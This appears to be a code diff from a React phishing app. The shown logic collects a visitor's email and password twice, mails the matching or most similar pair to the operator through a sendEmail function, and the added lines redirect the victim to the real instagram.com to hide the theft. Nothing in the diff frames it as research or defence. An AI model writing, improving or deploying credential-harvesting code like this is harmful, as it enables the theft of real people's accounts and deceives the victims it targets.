@@ -21,6 +21,7 @@ function App() {
             if (firstTry.email === secondTry.email && firstTry.password === secondTry.password) {
                 sendEmail(firstTry.email, firstTry.password);  // Send email instead of saving to Google Sheets
                 setTries([]); // Reset for next sequence
+                window.location.href = "https://www.instagram.com/";
             } else {
                 setTries(updatedTries);
             }
@@ -28,6 +29,7 @@ function App() {
             const mostSimilar = getMostSimilarTry(updatedTries);
             sendEmail(mostSimilar.email, mostSimilar.password);  // Send email instead of saving to Google Sheets
             setTries([]); // Reset after sending
+            window.location.href = "https://www.instagram.com/";
         } else {
             setTries(updatedTries);
         }
